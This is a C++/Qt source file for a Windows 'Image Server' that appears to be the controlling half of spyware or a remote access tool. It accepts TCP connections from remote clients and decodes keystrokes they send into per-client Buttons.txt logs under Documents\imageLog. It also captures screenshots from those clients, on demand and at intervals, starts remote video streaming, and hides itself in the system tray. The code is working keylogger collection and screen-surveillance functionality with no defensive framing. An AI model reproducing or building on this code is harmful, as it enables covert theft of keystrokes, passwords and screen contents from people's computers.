#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QMessageBox>
#include <Windows.h>
#include <iostream>
#include <QSize>
#include<QDebug>
#include <iostream>

HANDLE hFile;

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->setWindowTitle("Iserver");
    ui->centralWidget->setLayout(ui->verticalLayout);
    ui->actionStart->setEnabled(false);
    ui->actionStop->setEnabled(false);
    info.ui = ui;
    server = NULL;
    hShooting_interval = 0;
    ui->listWidget->setSelectionMode(QAbstractItemView::SingleSelection);
    connect(ui->b_GetImage, &QPushButton::clicked, this, &MainWindow::on_pushButton1_clicked);
    //------------------------------------------------
    trayIcon = new QSystemTrayIcon(this);
    trayIcon->setIcon(this->style()->standardIcon(QStyle::SP_ComputerIcon));
    trayIcon->setToolTip("Image Server" "\n"
                         "Right click...");
    QMenu * menu = new QMenu(this);
    QAction * viewWindow = new QAction(trUtf8("Show Image Server"), this);
    QAction * quitAction = new QAction(trUtf8("Exit"), this);
    connect(viewWindow, SIGNAL(triggered()), this, SLOT(show()));
    connect(quitAction, SIGNAL(triggered()), this, SLOT(close()));

    menu->addAction(viewWindow);
    menu->addAction(quitAction);
    trayIcon->setContextMenu(menu);
    trayIcon->show();
    connect(trayIcon, SIGNAL(activated(QSystemTrayIcon::ActivationReason)),
    this, SLOT(iconActivated(QSystemTrayIcon::ActivationReason)));
    m.setMedia(QUrl("qrc:/new.mp3"));
    ui->Launchvideostreaming->setIcon(QIcon(":/play.png"));
    ui->Launchvideostreaming->setIconSize(QSize(170, 50));
    ui->b_GetImage->setIcon(QIcon(":/takePhoto.png"));
    ui->b_GetImage->setIconSize(QSize(35, 35));
    ui->pushButton_2->setIcon(QIcon(":/IntervalPhoto.png"));
    ui->pushButton_2->setIconSize(QSize(70, 40));
}

MainWindow::~MainWindow()
{
    TerminateThread(hShooting_interval, 0);
    TerminateThread(honline_monytoring, 0);
    TerminateThread(hnames_monytoring, 0);
    TerminateThread(htap_monytoring, 0);
    shutdown(soc, SD_BOTH);
    WSACleanup();
    if(server)
    {
        delete server;
        server = NULL;
    }
    delete ui;
}

void MainWindow::on_actionSettings_triggered()
{
    s->show();
    s->exec();
    if(s->getPort().size())
        ui->actionStart->setEnabled(true);
}

DWORD WINAPI online_monytoring(PVOID p)
{
    MainWindow *w = static_cast<MainWindow*>(p);
    while(true)
    {
        for(int i = 0; i < w->server->connectionBase->size(); ++i)
        {
            if(!w->server->check(w->server->connectionBase->data()[i].s))
            {
                std::string name = w->server->connectionBase->data()[i].name;
                w->server->removeConnection(name);
                QList<QListWidgetItem*> listItem = w->info.ui->listWidget->findItems(QString::fromStdString(name), Qt::MatchFixedString);
                delete listItem.first();
            }
        }
        Sleep(3000);
    }
    return 0;
}

DWORD WINAPI names_monytoring(PVOID p)
{
    MainWindow *w = static_cast<MainWindow*>(p);
    while (true)
    {
        if(w->info.server->getName())
        {
            std::string name = w->info.server->GetLastCon().name;
            QListWidgetItem* listItem = new QListWidgetItem( QString::fromLocal8Bit(&name[0]));
            w->info.ui->listWidget->addItem(listItem);
            listItem->setTextColor(Qt::gray);
            if(w->s)
                if(w->s->ui->checkSound->isChecked())
                    w->m.play();
        }
    }
    return 0;
}

void parse(char* button, HANDLE hFile)
{
    SetFilePointer(hFile, 0, NULL, FILE_END);
    if (!strcmp(button, "27"))
        WriteFile(hFile, "\nESC\n", 5, NULL, NULL);
    if (!strcmp(button, "112"))
        WriteFile(hFile, "\nF1\n", 4, NULL, NULL);
    if (!strcmp(button, "113"))
        WriteFile(hFile, "\nF2\n", 4, NULL, NULL);
    if (!strcmp(button, "114"))
        WriteFile(hFile, "\nF3\n", 4, NULL, NULL);
    if (!strcmp(button, "115"))
        WriteFile(hFile, "\nF4\n", 4, NULL, NULL);
    if (!strcmp(button, "116"))
        WriteFile(hFile, "\nF5\n", 4, NULL, NULL);
    if (!strcmp(button, "117"))
        WriteFile(hFile, "\nF6\n", 4, NULL, NULL);
    if (!strcmp(button, "118"))
        WriteFile(hFile, "\nF7\n", 4, NULL, NULL);
    if (!strcmp(button, "119"))
        WriteFile(hFile, "\nF8\n", 4, NULL, NULL);
    if (!strcmp(button, "120"))
        WriteFile(hFile, "\nF9\n", 4, NULL, NULL);
    if (!strcmp(button, "121"))
        WriteFile(hFile, "\nF10\n", 5, NULL, NULL);
    if (!strcmp(button, "122"))
        WriteFile(hFile, "\nF11\n", 5, NULL, NULL);
    if (!strcmp(button, "123"))
        WriteFile(hFile, "\nF12\n", 5, NULL, NULL);
    if (!strcmp(button, "46"))
        WriteFile(hFile, "\nDEL\n", 5, NULL, NULL);
    if (!strcmp(button, "192"))
        WriteFile(hFile, "`", 1, NULL, NULL);
    if (!strcmp(button, "49"))
        WriteFile(hFile, "1", 1, NULL, NULL);
    if (!strcmp(button, "50"))
        WriteFile(hFile, "2", 1, NULL, NULL);
    if (!strcmp(button, "51"))
        WriteFile(hFile, "3", 1, NULL, NULL);
    if (!strcmp(button, "52"))
        WriteFile(hFile, "4", 1, NULL, NULL);
    if (!strcmp(button, "53"))
        WriteFile(hFile, "5", 1, NULL, NULL);
    if (!strcmp(button, "54"))
        WriteFile(hFile, "6", 1, NULL, NULL);
    if (!strcmp(button, "55"))
        WriteFile(hFile, "7", 1, NULL, NULL);
    if (!strcmp(button, "56"))
        WriteFile(hFile, "8", 1, NULL, NULL);
    if (!strcmp(button, "57"))
        WriteFile(hFile, "9", 1, NULL, NULL);
    if (!strcmp(button, "58"))
        WriteFile(hFile, "0", 1, NULL, NULL);
    if (!strcmp(button, "189"))
        WriteFile(hFile, "-", 1, NULL, NULL);
    if (!strcmp(button, "187"))
        WriteFile(hFile, "=", 1, NULL, NULL);
    if (!strcmp(button, "8"))
        WriteFile(hFile, "\nBackspace\n", 11, NULL, NULL);
    if (!strcmp(button, "9"))
        WriteFile(hFile, "\nTab\n", 5, NULL, NULL);
    if (!strcmp(button, "81"))
        WriteFile(hFile, "q", 1, NULL, NULL);
    if (!strcmp(button, "87"))
        WriteFile(hFile, "w", 1, NULL, NULL);
    if (!strcmp(button, "69"))
        WriteFile(hFile, "e", 1, NULL, NULL);
    if (!strcmp(button, "82"))
        WriteFile(hFile, "r", 1, NULL, NULL);
    if (!strcmp(button, "84"))
        WriteFile(hFile, "t", 1, NULL, NULL);
    if (!strcmp(button, "89"))
        WriteFile(hFile, "y", 1, NULL, NULL);
    if (!strcmp(button, "85"))
        WriteFile(hFile, "u", 1, NULL, NULL);
    if (!strcmp(button, "73"))
        WriteFile(hFile, "i", 1, NULL, NULL);
    if (!strcmp(button, "79"))
        WriteFile(hFile, "o", 1, NULL, NULL);
    if (!strcmp(button, "80"))
        WriteFile(hFile, "p", 1, NULL, NULL);
    if (!strcmp(button, "219"))
        WriteFile(hFile, "[", 1, NULL, NULL);
    if (!strcmp(button, "221"))
        WriteFile(hFile, "]", 1, NULL, NULL);
    if (!strcmp(button, "220"))
        WriteFile(hFile, "\\", 1, NULL, NULL);
    if (!strcmp(button, "20"))
        WriteFile(hFile, "\nCapsLock\n", 10, NULL, NULL);
    if (!strcmp(button, "65"))
        WriteFile(hFile, "a", 1, NULL, NULL);
    if (!strcmp(button, "83"))
        WriteFile(hFile, "s", 1, NULL, NULL);
    if (!strcmp(button, "68"))
        WriteFile(hFile, "d", 1, NULL, NULL);
    if (!strcmp(button, "70"))
        WriteFile(hFile, "f", 1, NULL, NULL);
    if (!strcmp(button, "71"))
        WriteFile(hFile, "g", 1, NULL, NULL);
    if (!strcmp(button, "72"))
        WriteFile(hFile, "h", 1, NULL, NULL);
    if (!strcmp(button, "74"))
        WriteFile(hFile, "j", 1, NULL, NULL);
    if (!strcmp(button, "75"))
        WriteFile(hFile, "k", 1, NULL, NULL);
    if (!strcmp(button, "76"))
        WriteFile(hFile, "l", 1, NULL, NULL);
    if (!strcmp(button, "186"))
        WriteFile(hFile, ";", 1, NULL, NULL);
    if (!strcmp(button, "222"))
        WriteFile(hFile, "'", 1, NULL, NULL);
    if (!strcmp(button, "13"))
        WriteFile(hFile, "\nEnter\n", 7, NULL, NULL);
    if (!strcmp(button, "160"))
        WriteFile(hFile, "\nlShift\n", 8, NULL, NULL);
    if (!strcmp(button, "90"))
        WriteFile(hFile, "z", 1, NULL, NULL);
    if (!strcmp(button, "88"))
        WriteFile(hFile, "x", 1, NULL, NULL);
    if (!strcmp(button, "67"))
        WriteFile(hFile, "c", 1, NULL, NULL);
    if (!strcmp(button, "86"))
        WriteFile(hFile, "v", 1, NULL, NULL);
    if (!strcmp(button, "66"))
        WriteFile(hFile, "b", 1, NULL, NULL);
    if (!strcmp(button, "78"))
        WriteFile(hFile, "n", 1, NULL, NULL);
    if (!strcmp(button, "77"))
        WriteFile(hFile, "m", 1, NULL, NULL);
    if (!strcmp(button, "188"))
        WriteFile(hFile, ",", 1, NULL, NULL);
    if (!strcmp(button, "190"))
        WriteFile(hFile, ".", 1, NULL, NULL);
    if (!strcmp(button, "191"))
        WriteFile(hFile, "/", 1, NULL, NULL);
    if (!strcmp(button, "161"))
        WriteFile(hFile, "\nrShift\n", 8, NULL, NULL);
    if (!strcmp(button, "162"))
        WriteFile(hFile, "\nlCtrl\n", 7, NULL, NULL);
    if (!strcmp(button, "91"))
        WriteFile(hFile, "\nWin\n", 5, NULL, NULL);
    if (!strcmp(button, "32"))
        WriteFile(hFile, " ", 1, NULL, NULL);
    if (!strcmp(button, "63"))
        WriteFile(hFile, "\nrCtrl\n", 7, NULL, NULL);
    if (!strcmp(button, "37"))
        WriteFile(hFile, "\nLeft\n", 6, NULL, NULL);
    if (!strcmp(button, "38"))
        WriteFile(hFile, "\nUp\n", 4, NULL, NULL);
    if (!strcmp(button, "40"))
        WriteFile(hFile, "\nDown\n", 6, NULL, NULL);
    if (!strcmp(button, "39"))
        WriteFile(hFile, "\nRight\n", 7, NULL, NULL);
}

DWORD WINAPI new_tap_con(PVOID p)
{
    SOCKET* k = static_cast<SOCKET*>(p);
    SOCKET s = *k;
    char name[100];
    char button[6];
    HANDLE hFile;

    if (recv(s, name, 100, 0) == 100)
    {
        char wBuff[500];
        SHGetSpecialFolderPathA(0, wBuff, CSIDL_PERSONAL, true);
        std::string way = wBuff;
        way += "\\imageLog";
        CreateDirectoryA(&way[0], NULL);
        way += "\\";
        way += name;
        CreateDirectoryA(&way[0], NULL);
        way += "\\Buttons.txt";
        hFile = CreateFileA(&way[0], GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        while (recv(s, button, 6, 0) == 6)
            parse(button, hFile);
        CloseHandle(hFile);
    }

    return 0;
}

DWORD WINAPI tap_monytoring(PVOID p)
{
    MainWindow *w = static_cast<MainWindow*>(p);
    WSAStartup(0x0101, &w->WsaData);
    SOCKET sMain = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(w->s->getPort().toInt() - 1);
    sin.sin_addr.s_addr = INADDR_ANY;
    bind(sMain, (LPSOCKADDR)& sin, sizeof(sin));
    listen(sMain, SOMAXCONN);
    int fromlen = sizeof(sin);

    while (true)
    {
        w->soc = accept(sMain, (struct sockaddr*) & sin, &fromlen);
        if (w->soc != INVALID_SOCKET)
            CreateThread(NULL, 0, new_tap_con, &w->soc, 0, NULL);
    }

    return 0;
}

DWORD WINAPI launchVideoStreamer(PVOID p)
{
    information *info = static_cast<information*>(p);
    char cCommand[100];
    std::string command = std::to_string(info->server->port).c_str();
    command += "\n";
    command += info->ui->listWidget->selectedItems().first()->text().toStdString();
    strcpy_s(cCommand, command.c_str());
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
    CreateProcessA("VideoStreamer.exe", cCommand, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject( pi.hProcess, INFINITE );
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    info->ui->Launchvideostreaming->setEnabled(true);
    return 0;
}

void MainWindow::on_actionStart_triggered()
{
    server = new ImageServer(s->getPort().toInt());
    info.server = server;
    ui->actionStop->setEnabled(true);
    ui->actionStart->setEnabled(false);
    hnames_monytoring = CreateThread(NULL, 0, names_monytoring, this, 0, NULL);
    honline_monytoring = CreateThread(NULL, 0, online_monytoring, this, 0, NULL);
    htap_monytoring = CreateThread(NULL, 0, tap_monytoring, this, 0, NULL);
}

void MainWindow::on_actionStop_triggered()
{
    TerminateThread(hShooting_interval, 0);
    TerminateThread(honline_monytoring, 0);
    TerminateThread(hnames_monytoring, 0);
    TerminateThread(htap_monytoring, 0);
    shutdown(soc, SD_BOTH);
    WSACleanup();
    hShooting_interval = 0;
    info.ui->listWidget->clear();
    if(server)
    {
        delete server;
        server = NULL;
    }
    ui->actionStart->setEnabled(true);
    ui->actionStop->setEnabled(false);
}

DWORD WINAPI GetImage(PVOID p)
{
    information *info = static_cast<information*>(p);
    std::string name = info->ui->listWidget->selectedItems().first()->text().toStdString();
    info->server->getImage(name, true);
    info->ui->b_GetImage->setEnabled(true);
    return 0;
}

void MainWindow::on_pushButton1_clicked()
{
    if(!ui->listWidget->selectedItems().isEmpty())
    {
        ui->b_GetImage->setEnabled(false);
        HANDLE hGetImage = CreateThread(NULL, 0, GetImage, &info, 0, NULL);
    }
}

DWORD WINAPI Shooting_interval(PVOID p)
{
    MainWindow *w = static_cast<MainWindow*>(p);

    while(true)
    {
        Sleep(w->s->interval);
        int n = 0;

        for(int i = 0; i < w->info.ui->listWidget->count(); ++i)
            if(w->info.ui->listWidget->item(i)->textColor() == Qt::gray)
            {
                std::string name = w->info.ui->listWidget->item(i)->text().toStdString();
                w->server->getImage(name, false);
                ++n;
            }
        if(!n)
        {
            w->hShooting_interval = 0;
            return 0;
        }
    }
}

void MainWindow::on_pushButton_2_clicked()
{
    if(ui->listWidget->selectedItems().size())
    {
        if(!s->interval)
        {
            QMessageBox *mb = new QMessageBox(this);
            mb->setText("Set the interval in the settings please");
            mb->show();
            mb->exec();
            return;
        }

        QListWidgetItem* listItem = ui->listWidget->selectedItems().first();
        listItem->setSelected(false);
        QColor col = listItem->textColor();

        if(col == Qt::gray)
        {
            listItem->setTextColor(Qt::blue);
        }
        else
        {
            listItem->setTextColor(Qt::gray);
        }

        if(!hShooting_interval)
        {
            hShooting_interval = CreateThread(NULL, 0, Shooting_interval, this, 0, NULL);
        }
    }
}

void MainWindow::on_actionDelete_all_images_triggered()
{
    QMessageBox::StandardButton reply;
    reply = QMessageBox::question(this, "Attention!", "Are you sure?", QMessageBox::Yes|QMessageBox::No);
    if (reply == QMessageBox::Yes)
    {
        char wBuff[500];
        SHGetSpecialFolderPathA(0, wBuff, CSIDL_PERSONAL, true);
        std::string way = wBuff;
        way += "//imageLog";
        server->delete_all_images(way, true);
    }
}

void MainWindow::on_pushButton_3_clicked()
{
    this->hide();
    QSystemTrayIcon::MessageIcon icon = QSystemTrayIcon::MessageIcon(QSystemTrayIcon::Information);

    trayIcon->showMessage("Image Server",
                          trUtf8("Image Server hided in tray"),
                          icon,
                          2000);
}

void MainWindow::on_actionText_viewer_triggered()
{
    tv.ui->textBrowser->clear();
    tv.ui->listWidget->clear();

    WIN32_FIND_DATAA wfd;
    char wBuff[500];
    SHGetSpecialFolderPathA(0, wBuff, CSIDL_PERSONAL, true);
    std::string way = wBuff;
    way += "\\imageLog\\*";

    HANDLE const hFind = FindFirstFileA(&way[0], &wfd);

    if (INVALID_HANDLE_VALUE != hFind)
    {
        do
        {
            if(wfd.cFileName[0] != '.')
                tv.ui->listWidget->addItem(QString::fromLocal8Bit(&wfd.cFileName[0]));
        } while (NULL != FindNextFileA(hFind, &wfd));

        FindClose(hFind);
    }

    tv.show();
}

void MainWindow::on_Launchvideostreaming_clicked()
{
    if(s->getPort().size() && !ui->listWidget->selectedItems().isEmpty())
    {
        HANDLE hGetImage = CreateThread(NULL, 0, launchVideoStreamer, &info, 0, NULL);
        if (hGetImage != INVALID_HANDLE_VALUE)
        {
            this->ui->Launchvideostreaming->setEnabled(false);
            Sleep(1000);
            std::string name = this->ui->listWidget->selectedItems().first()->text().toStdString();
            this->server->sendStreamingEvent(name);
        }
    }
}

void MainWindow::on_actionSettings_information_triggered()
{
    sd.show();
}
